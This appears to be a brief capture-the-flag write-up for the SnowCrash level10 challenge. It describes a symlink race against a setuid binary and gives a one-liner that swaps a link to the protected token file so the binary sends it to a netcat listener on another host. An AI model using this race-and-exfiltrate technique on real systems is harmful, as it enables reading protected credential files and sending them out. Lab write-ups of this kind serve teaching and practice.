Here we have a yet another binary file

The goal is to trick the binary into reading our token file

To do so, we have to “abuse” symlinks

We can see in the binary that it can in fact read access a file and output it way later. But it doesn’t work with our token because we don’t have the permissions for

So the idea is to make it access a validate file on which we have permissions and then and only then link the token we need to read

The program will read this and send it to the server link, which we have to make listen with : 

nc -l 6969

An exemple could be :

level10@SnowCrash:~$ ln -snf /var/crash/aled.txt /var/crash/link ; ./level10 /var/crash/link 192.168.64.1 | ln -snf ~/token /var/crash/link
